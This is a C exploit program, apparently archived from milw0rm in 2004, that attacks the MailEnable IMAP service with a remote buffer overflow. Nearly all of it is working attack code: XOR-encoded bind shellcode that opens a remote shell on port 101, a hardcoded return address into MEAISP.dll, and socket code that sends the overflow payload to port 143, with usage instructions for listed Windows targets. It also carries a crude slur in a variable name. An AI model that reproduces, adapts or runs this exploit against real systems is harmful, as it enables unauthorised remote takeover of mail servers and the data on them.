/*
 
MailEnable , IMAP Service, Remote Buffer Overflow Exploit v0.4
 
Homepage         : www.mailenable.com
Affected versions: Pro        v1.52
       Enterprise v1.01
 
Bug discovery    : Nima Majidi at www.hat-squad.com
Exploit code     : class101    at www.hat-squad.com
           & dfind.kd-team.com
 
Fix              : http://mailenable.com/hotfix/MEIMAPS-HF041125.zip
 
Compilation      : 101_ncat.cpp ......... Win32 (MSVC,cygwin)
                   101_ncat.c ........... Linux
 
*/
 
#include <stdio.h>
#include <string.h>
#include <time.h>
#ifdef WIN32
#include "winsock2.h"
#pragma comment(lib, "ws2_32")
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#endif
 
file://BIND shellcode port 101, XORed 0x88, thanx HDMoore.
 
char scode[] =
"\xEB"
"\x0F\x58\x80\x30\x88\x40\x81\x38\x68\x61\x63\x6B\x75\xF4\xEB\x05\xE8\xEC\xFF\xFF"
"\xFF\x60\xDE\x88\x88\x88\xDB\xDD\xDE\xDF\x03\xE4\xAC\x90\x03\xCD\xB4\x03\xDC\x8D"
"\xF0\x89\x62\x03\xC2\x90\x03\xD2\xA8\x89\x63\x6B\xBA\xC1\x03\xBC\x03\x89\x66\xB9"
"\x77\x74\xB9\x48\x24\xB0\x68\xFC\x8F\x49\x47\x85\x89\x4F\x63\x7A\xB3\xF4\xAC\x9C"
"\xFD\x69\x03\xD2\xAC\x89\x63\xEE\x03\x84\xC3\x03\xD2\x94\x89\x63\x03\x8C\x03\x89"
"\x60\x63\x8A\xB9\x48\xD7\xD6\xD5\xD3\x4A\x80\x88\xD6\xE2\xB8\xD1\xEC\x03\x91\x03"
"\xD3\x84\x03\xD3\x94\x03\x93\x03\xD3\x80\xDB\xE0\x06\xC6\x86\x64\x77\x5E\x01\x4F"
"\x09\x64\x88\x89\x88\x88\xDF\xDE\xDB\x01\x6D\x60\xAF\x88\x88\x88\x18\x89\x88\x88"
"\x3E\x91\x90\x6F\x2C\x91\xF8\x61\x6D\xC1\x0E\xC1\x2C\x92\xF8\x4F\x2C\x25\xA6\x61"
"\x51\x81\x7D\x25\x43\x65\x74\xB3\xDF\xDB\xBA\xD7\xBB\xBA\x88\xD3\x05\xC3\xA8\xD9"
"\x77\x5F\x01\x57\x01\x4B\x05\xFD\x9C\xE2\x8F\xD1\xD9\xDB\x77\xBC\x07\x77\xDD\x8C"
"\xD1\x01\x8C\x06\x6A\x7A\xA3\xAF\xDC\x77\xBF\x77\xDD\xB8\xB9\x48\xD8\xD8\xD8\xD8"
"\xC8\xD8\xC8\xD8\x77\xDD\xA4\x01\x4F\xB9\x53\xDB\xDB\xE0\x8A\x88\x88\xED\x01\x68"
"\xE2\x98\xD8\xDF\x77\xDD\xAC\xDB\xDF\x77\xDD\xA0\xDB\xDC\xDF\x77\xDD\xA8\x01\x4F"
"\xE0\xCB\xC5\xCC\x88\x01\x6B\x0F\x72\xB9\x48\x05\xF4\xAC\x24\xE2\x9D\xD1\x7B\x23"
"\x0F\x72\x09\x64\xDC\x88\x88\x88\x4E\xCC\xAC\x98\xCC\xEE\x4F\xCC\xAC\xB4\x89\x89"
"\x01\xF4\xAC\xC0\x01\xF4\xAC\xC4\x01\xF4\xAC\xD8\x05\xCC\xAC\x98\xDC\xD8\xD9\xD9"
"\xD9\xC9\xD9\xC1\xD9\xD9\xDB\xD9\x77\xFD\x88\xE0\xFA\x76\x3B\x9E\x77\xDD\x8C\x77"
"\x58\x01\x6E\x77\xFD\x88\xE0\x25\x51\x8D\x46\x77\xDD\x8C\x01\x4B\xE0\x77\x77\x77"
"\x77\x77\xBE\x77\x5B\x77\xFD\x88\xE0\xF6\x50\x6A\xFB\x77\xDD\x8C\xB9\x53\xDB\x77"
"\x58\x68\x61\x63\x6B\x90";
 
static char payload[10000];
 
char magikcll[]="\x7a\x8c\x01\x10"; file://CALL EDI - MEAISP.dll - "Universal"
char gay[]="\x4b\x2d\x4f\x54\x69\x4b"; file://long F0CK to them
 
void usage(char* us);
 
#ifdef WIN32
 WSADATA wsadata;
#endif
 
void ver();
 
int main(int argc,char *argv[])
{
 ver();
 if ((argc<3)||(argc>4)||(atoi(argv[1])<1)||(atoi(argv[1])>1)){usage(argv[0]);return -1;} 
#ifndef WIN32
#define Sleep  sleep
#define SOCKET  int
#define closesocket(s) close(s)
#else
 if (WSAStartup(MAKEWORD(2,0),&wsadata)!=0){printf("[+] wsastartup error\n");return -1;}
#endif
 int ip=htonl(inet_addr(argv[2])), sz, port, sizeA, a;
 char *target, *os;
 if (argc==4){port=atoi(argv[3]);}
 else port=143;
 if (atoi(argv[1]) == 1){target=magikcll;os="Win2k SP4 Pro    English\n[+]         Win2k SP4 Pro    French\n[+]         Win2k SP4 Server English\n[+]         all Win2k, NT4 (supposed)";}
 SOCKET s;fd_set mask;struct timeval timeout;struct sockaddr_in server;
 s=socket(AF_INET,SOCK_STREAM,0);
 if (s==-1) {printf("[+] socket() error\n");return -1;}
 printf("[+] target: %s\n",os);   
 server.sin_family=AF_INET;
 server.sin_addr.s_addr=htonl(ip);
 server.sin_port=htons(port);
 connect(s,( struct sockaddr *)&server,sizeof(server));
 timeout.tv_sec=3;timeout.tv_usec=0;FD_ZERO(&mask);FD_SET(s,&mask);
 switch(select(s+1,NULL,&mask,NULL,&timeout))
 {
  case -1: {printf("[+] select() error\n");closesocket(s);return -1;}
  case 0: {printf("[+] connect() error\n");closesocket(s);return -1;}
  default:
  if(FD_ISSET(s,&mask))
  {
   printf("[+] connected, constructing the payload...\n");
#ifdef WIN32
   Sleep(2000);
#else
   Sleep(2);
#endif
   sizeA=8202-sizeof(scode);
   sz=3+8198+4;
   memset(payload,0,sizeof(payload));
   strcat(payload,"\x41\x41\x41");
   strcat(payload,scode);
   for (a=0;a<sizeA;a++){strcat(payload,"\x41");}
   strcat(payload,target);
   strcat(payload,"\r\n");
      if (send(s,payload,strlen(payload),0)==-1) { printf("[+] sending error, the server prolly rebooted.");return -1;}
#ifdef WIN32
   Sleep(1000);
#else
   Sleep(1);
#endif
   printf("[+] size of payload: %d\n",sz);   
   printf("[+] payload send, connect the port 101 to get a shell.\n");
   return 0;
  }
 }
 closesocket(s);
#ifdef WIN32
 WSACleanup();
#endif
 return 0;
}
 

void usage(char* us)
{ 
 printf("USAGE: 101_mEna.exe Target Ip Port\n");
 printf("TARGETS:                               \n");
 printf("      [+] 1. Win2k SP4 Pro    English  (*)\n");
 printf("      [+] 1. Win2k SP4 Pro    French   (*)\n");
 printf("      [+] 1. Win2k SP4 Server English  (*)\n");
 printf("      [+] 1. All Win2K, NT4               \n");
 printf("NOTE:                               \n");
 printf("      The port 143 is default if no port are specified\n");
 printf("      The exploit bind a shellcode to the port 101\n");
 printf("      A wildcard (*) mean Tested.\n");
 return;
}
void ver()
{ 
printf("                                                                   \n");
printf("        ===================================================[v0.1]====\n");
printf("        ======MailEnable, Pro Mail Server for Windows <= v1.52=======\n");
printf("        ========IMAP Service, Remote Buffer Overflow Exploit=========\n");
printf("        ======coded by class101=============[Hat-Squad.com 2004]=====\n");
printf("        =============================================================\n");
printf("                                                                   \n");
}

// milw0rm.com [2004-11-25]
